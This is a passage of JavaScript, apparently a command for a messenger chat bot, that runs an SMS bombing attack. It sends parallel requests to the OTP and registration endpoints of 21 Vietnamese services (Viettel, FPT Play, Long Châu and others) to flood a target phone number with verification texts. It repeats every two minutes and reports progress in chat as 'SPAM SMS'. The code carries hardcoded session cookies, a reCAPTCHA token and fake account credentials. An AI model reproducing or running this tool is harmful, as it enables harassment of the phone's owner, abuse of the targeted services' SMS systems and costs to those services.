          'cookie': 'PHPSESSID=kinglbn5spravi3luvaatgs3jp; __Secure-API_SESSION=kinglbn5spravi3luvaatgs3jp; cdp_customerIdentify=1; _gcl_au=1.1.687785078.1703860922; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _gcl_aw=GCL.1703860929.CjwKCAiA-bmsBhAGEiwAoaQNmgcF7QjCtXC0oVUR6tR1trfoIm6IB2LRFOvYfhoUbSdCSUBBKJlssRoC6sEQAvD_BwE; _atm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6ImFzc29jaWF0ZV91dG0i%0D%0ALCJjaGVja3N1bSI6IioiLCJ0aW1lIjoxNzAzODYwOTI5NzQzfQ%3D%3D; _pk_ref.564990546.fc16=%5B%22%22%2C%22%22%2C1703860930%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990546.fc16=*; form_key=HjN8YsX4Mj1p9W9E; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=HjN8YsX4Mj1p9W9E; _fbp=fb.1.1703860934946.540016440; _ga=GA1.1.1236270977.1703860935; _cdp_cfg=1; _cdp_fsid=3752649465283696; _asm_visitor_type=n; _ac_au_gt=1703860933843; _tt_enable_cookie=1; _ttp=IifvYCxKQHopLZQZnGf5XzcMpUz; _asm_uid=1380356661; store=hcm; private_content_version=updated-658edad32e5e12.60064562; X-Magento-Vary=e46423ae947909f49073dd3d5e74aa7e8975e2be; _asm_ss_view=%7B%22time%22%3A1703860935474%2C%22sid%22%3A%223752649465283696%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222023-12-29T14%3A42%3A46%22%2C%22duration%22%3A30994%7D; _ga_T93VCQ3ZQS=GS1.1.1703860935.1.1.1703860967.28.0.0; _pk_id.564990546.fc16=1380356661.1703860930.1.1703860983.1703860930.; _ac_client_id=1380356661.1703860983; _ac_an_session=zgzkzmzhzlznzqznzlzmzhzrzgzlzqzlzdzizgzrzjzgzmzlzlzlzizdzizkzjzgzrzlzjzqzrzgzdzizdzizkzjzgzrzlzjzqzrzgzdzizkzjzgzrzlzjzqzrzgzdzizdzhzlzdzhzd2f27zdzgzdzlzmzlzkzjzd; au_id=1380356661; section_data_ids=%7B%22customer%22%3A1703861934%2C%22cart%22%3A1703861970%2C%22shipping_address_selected%22%3A1703861972%2C%22messages%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22faq%22%3Anull%2C%22ammessages%22%3Anull%2C%22rewards%22%3Anull%2C%22ins%22%3Anull%2C%22custom_address_local_storage_data%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D',
          'dnt': '1',
          'origin': 'https://www.kidsplaza.vn',
          'referer': 'https://www.kidsplaza.vn/',
          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'x-requested-with': 'XMLHttpRequest',
        };

        const kidsplazaData = {
          data: {
            password: 'Qưert1234',
            confirm_password: 'Qưert1234',
            phone: phone,
            email: 'caobaquat@gmail.com',
            name: 'cao qua quat',
            website_id: '2',
            g_recaptcha_response: '03AFcWeA75cAjgxMNMOL5LbmcYAhxTdK2QLb3HgQ96S8MbpbVFLlCj5-U4AGBKZBg3PEyDyCw1gp1wmsGpeiEVKZ3wmLAkySQAhE_v-on0nHF1-ypoucOAVp9QS8X7J9EFxUuo2bQ1Iysa7OgVxzQ9jRz4JZ3SLHtjmjjl0UoYYrBFBamdaUvCZrRNw9HjuIyPQJrxXuCsL4Bw0FpqSaRAHrsF4aP4mMV7azfBII4n6foFEjbV5v9hyYtRkwj_vvwIBV2PpI9rtcI1zy2e0cnlONPVCO3pSIdBpnU6b1Q45RiCU8PZ5YHxQNzYQDNhdOW8SDKBV7PBjB_rk4puJ-EjuAa8xih2TfGpXkIxPV_B4MXshMiUYOGK6kAW1jtC06Ai49Sv2xAbyl_sJZ9kyPYCLmPUigyUhZfDTk6wzf1FTxbi9IwZ5Y69zkkIdI3E6cGK-QYPKl8NY9EQhgtKRSp-VcdGLIpanU1EmTeeuXn_q1EK-fxvN4rTJtGgwo4--UP2_kA2lk3Cygn3uFIZNnB_7YtlaeMvA-QQWJdjXM7R9frcK3KdxbIhkCKxw8xCMSYbc9wbIw-6vbUuUVoMM7vQNkmRb-Klu5tewPi9uOItwDiYmXQLBjW7ucTjvv63sZ_ZPYtAVmOc4iNMvJ3mi2k1XO7zYmZp7pNm2b47vzUIh-fmpOjDarghErGglilfy1U5grW_HV1scyhp5lWrSLhyQ9a_n3cxBCkqoRCeFv3rdco7KotOV1u1BfON_xHLeAGrbgpOybT62N0hjcFS8RElTEf8pddtQ-jz0EqfuP5N1kOi-6g4lY9bggZJ09bbJkdGXb1VmVLrlOAOTCgqW_0cAA7HqOXjpM3Nqtp9sp8IifvCpp_1nKHaACNyJca4Nla-ftROHVnHxLxq656pZws_7tEBBZzhkCuC_8x7Q_tJ_vfNLPDY13TY-Ep-jd9YM-hYxU-RnBidA8BJ4FvJjEVBLH9i7TKKO-quVZWIVRSY8o5xbymism17BCtpfZztjfC8q2_S2D5_EPWgkojMlfBkeeg3rlTnioP4NeGA1DE9cV-GP9_vpDcVGz1dg7wMbSKt59vw4yKnJX75fypBTAVgVrVyrvWRYF9fNBalVWQ6wu7ie_XpaCiOXVAys6UPl6lYsiJadvDJerYmRF58IJKSASUnunNZxN5zg-NGZvfu_ozzvRhrdlcvhc3Lm5xfN-uVT-GQfC0lg7yc30IOAMMVvjEGKA-XcJaGxq3Uw4ITikUSQRmr1u_PgoTV6qdxnYFaB9xV_sGMVT6z8P2SrSaUM4VWOL-SBZCbk7Mf2HOZYjxhglDwDJBt2DV2dgYNR-ApXpsNCjZwqnAzDGGH56XIX6Y7kk75C-C9aIHdErlX1ee3t6Pif8ZRcitngOrXMz_duyNPFKLVY78ZmBslhJJXJ_ywhh-P4tqxrDDlhYK1m_bwMwo4iWTYK2J92yTaX6c0cxg-TBYE0eAYZiscCvmxBf7egqpp6dMnFiS7f9JqFa8_lrG6gaFlaSrU9Q5hR77GbD9LO6eRLM68k1EE4APjUs9faxlhQ4z1rmB9b66HMab9Ug_dllDWSM9TUKTQOuJj4qoLmmD2bZAJ', // Update this with a valid reCAPTCHA response
          },
        };
            

    // Initial message to be edited later
    let messageID = null;
    let successCount = 0;
    let failureCount = 0;

    // Send initial message showing spam details
    const initialMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
    api.sendMessage(initialMessage, event.threadID, (error, messageInfo) => {
      if (!error) {
        messageID = messageInfo.messageID;
      }
    });

    // Function to send spam requests
    const sendSpamRequests = () => {
      // Send both requests in parallel
      Promise.all([
        axios.post('https://viettel.vn/api/get-otp', viettelData, {
          headers: viettelHeaders,
          withCredentials: true,
          cookies: viettelCookies,
        }),
        axios.post("http://m.tv360.vn/public/v1/auth/get-otp-login", tv360Data, {
          headers: tv360Headers
        }), 
        axios.post("https://api.kimungvay.co/h5/LoginMessage_ultimate", kimungvayData, {
          headers: kimungvayHeaders
        }), 
        axios.post("https://h5.vivohan.com/api/register/app/sendSms", vivohanData, {
          headers: vivohanHeaders,
          withCredentials: true,
          cookies: vivohanCookies,
        }), 
        axios.get('https://api.itaphoa.com/customer/send-gen-otp', {
          params: itaphoaParams,
          headers: itaphoaHeaders
        }), 
        axios.get('https://kavaycash.com/verification/', {
          headers: kavayHeaders,
          cookies: kavayCookies
        }), 
        axios.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', kingMeData, { headers: kingMeHeaders }), 
        axios.post('https://api.vieon.vn/backend/user/register/mobile', payload, {
  headers: vieonHeaders,
  params: params
}), 
        axios.post('https://products.popsww.com/api/v5/auths/register', popsData, { headers: popsHeaders }), 
        axios.post('https://concung.com/ajax.html?sendOtpLogin', data, { headers: headers, withCredentials: true, jar: cookies }), 
        axios.get('https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json', {
          params: topenlandParams,
          headers: topenlandHeaders,
          cookies: topenlandCookies
        }), 
        axios.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', null, {
          params: mochaParams,
          headers: mochaHeaders
        }), 
        axios.post('https://v9-cc.800best.com/uc/account/sendsignupcode', bestIncData, {
          headers: bestIncHeaders
        }), 
        axios.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', longChauData, {
          headers: longChauHeaders
        }), 
        axios.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', meeyIdData, { headers: meeyIdHeaders }),
        axios.post('https://api.onelife.vn/v1/gateway/', oneLifeData, { headers: oneLifeHeaders }),
        axios.post('https://api.popeyes.vn/api/v1/register', data, { headers: popeHeaders, cookies: popeCookies, withCredentials: true }), 
        axios.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', alfrescosData, { headers: alfrescosHeaders, params: alfrescosParams }), 
        axios.post(
          'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=CUZ-KiJXaLMJ7FszwK_Zrw&e=1703864126&device=Chrome(version%253A120.0.0.0)&drm=1',
          fptData,
          { headers: fptHeaders }
        ), 
        axios.post('https://api.ahamove.com/api/v3/public/user/register', ahamoveData, { headers: ahamoveHeaders }), 
        axios.post('https://www.kidsplaza.vn/rest/hcm/V1/customer/account/register/on-web', kidsplazaData, { headers: kidsplazaHeaders }), 
        ])
      .then(() => {
        successCount += 21;
        updateMessage();
      })
      .catch(() => {
        failureCount += 21;
        updateMessage();
      });
    };

    // Function to update the message with success and failure count
    const updateMessage = () => {
      const updatedMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
      if (messageID) {
        api.editMessage(updatedMessage, event.threadID, messageID);
      }
    };

    // Send the spam requests every 120 seconds (120000 milliseconds)
    const interval = setInterval(sendSpamRequests, 120000);

    // Send the first spam request immediately
    sendSpamRequests();

    // Stop spamming after the specified duration
    setTimeout(() => {
      clearInterval(interval);
      api.sendMessage(`Đã dừng spam SMS cho số ${phone}. Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`, event.threadID, event.messageID);
    }, spamDuration);
  }
};
